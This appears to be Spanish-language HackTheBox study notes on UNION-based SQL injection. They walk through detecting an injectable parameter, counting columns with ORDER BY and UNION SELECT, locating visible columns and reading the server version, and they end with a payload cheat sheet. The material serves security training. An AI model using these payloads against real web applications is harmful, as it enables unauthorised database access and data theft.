
## 1. Detectar una posible SQL Injection

Podemos comprobar si un parámetro es vulnerable introduciendo una comilla simple (`'`) y observando si la aplicación devuelve un error SQL.

Ejemplo:

```
http://SERVER_IP:PORT/search.php?port_code=cn'
```

Si aparece un error de sintaxis SQL, puede indicar que el parámetro es vulnerable a SQL Injection.

Las inyecciones basadas en `UNION` son especialmente útiles cuando podemos observar los resultados de las consultas en la página.

## 2. Detectar el número de columnas

Antes de utilizar `UNION SELECT`, necesitamos conocer el número de columnas que devuelve la consulta original.

Existen dos métodos principales:

- `ORDER BY`
    
- `UNION SELECT`
    

### Método 1: ORDER BY

Probamos a ordenar los resultados por diferentes columnas hasta encontrar una que provoque un error.

```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -
```

**Funcionamiento:**

1. Empezamos por `ORDER BY 1`.
    
2. Incrementamos el número de columna.
    
3. Continuamos mientras la consulta funcione.
    
4. Cuando obtenemos un error indicando que la columna no existe, la última columna válida nos permite determinar el número total de columnas.
    

Ejemplo:

```
' ORDER BY 4-- -
```

Funciona, pero:

```
' ORDER BY 5-- -
```

Devuelve un error. Por tanto, la consulta tiene **4 columnas**.

> En el ejemplo se utiliza `-- -` para introducir un comentario SQL. El espacio después de los dos primeros guiones es importante en MySQL/MariaDB.

### Método 2: UNION SELECT

También podemos probar diferentes cantidades de valores mediante `UNION SELECT`.

Primero probamos con tres columnas:

```
cn' UNION SELECT 1,2,3-- -
```

Si obtenemos un error como:

```
The used SELECT statements have a different number of columns
```

Significa que el número de columnas de ambas consultas no coincide.

Probamos con cuatro:

```
cn' UNION SELECT 1,2,3,4-- -
```

Si la consulta funciona, hemos encontrado el número correcto de columnas: **4**.

### Diferencias entre los dos métodos

|Método|Funcionamiento|
|---|---|
|`ORDER BY`|Aumentamos el índice de columna hasta provocar un error.|
|`UNION SELECT`|Probamos diferentes cantidades de valores hasta que la consulta funciona.|

## 3. Identificar las columnas visibles

Aunque la consulta devuelva varias columnas, la aplicación web puede mostrar solamente algunas de ellas.

Para identificar cuáles son visibles, utilizamos valores numéricos como marcadores:

```
cn' UNION SELECT 1,2,3,4-- -
```

Supongamos que la página muestra:

```
2    3    4
```

Esto indica que las columnas correspondientes a los valores `2`, `3` y `4` se muestran en la página, mientras que la primera columna no aparece.

**Conclusión:** debemos colocar la consulta que queremos ejecutar en una columna visible para poder observar su resultado.

Los números facilitan la identificación de las columnas porque podemos distinguir fácilmente qué valor aparece en cada posición.

## 4. Comprobar que podemos obtener datos reales

Una vez identificada una columna visible, podemos sustituir su número por una consulta SQL.

En el ejemplo, colocamos `@@version` en la segunda columna:

```
cn' UNION SELECT 1,@@version,3,4-- -
```

La variable `@@version` permite consultar la versión del servidor MySQL/MariaDB.

Un resultado posible sería:

```
10.3.22-MariaDB-1ubuntu1    3    4
```

Si aparece la versión en la página, hemos confirmado que podemos obtener información de la base de datos mediante la inyección `UNION`.

## 5. Procedimiento práctico para HTB

Cuando encontremos un posible punto de inyección, seguimos estos pasos:

1. **Comprobar la vulnerabilidad:** introducir una comilla simple (`'`) y observar la respuesta.
    
2. **Determinar el número de columnas:** utilizar `ORDER BY` o probar distintos números de valores con `UNION SELECT`.
    
3. **Identificar las columnas visibles:** utilizar valores numéricos como marcadores.
    
4. **Seleccionar una columna visible:** sustituir uno de los marcadores por una consulta SQL.
    
5. **Verificar la extracción de información:** probar con `@@version`.
    
6. **Continuar con la enumeración:** una vez confirmada la inyección, utilizar las columnas visibles para consultar información adicional de la base de datos.
    

## Chuleta rápida

|Objetivo|Payload|
|---|---|
|Comprobar una posible SQLi|`'`|
|Probar una columna|`' ORDER BY 1-- -`|
|Probar cuatro columnas|`cn' UNION SELECT 1,2,3,4-- -`|
|Identificar columnas visibles|`cn' UNION SELECT 1,2,3,4-- -`|
|Consultar la versión del servidor|`cn' UNION SELECT 1,@@version,3,4-- -`|

**Idea clave:** para explotar una SQL Injection mediante `UNION`, necesitamos conocer el número de columnas de la consulta original y localizar cuáles se muestran en la página. Así podremos colocar nuestras consultas en una posición cuyo resultado sea visible.
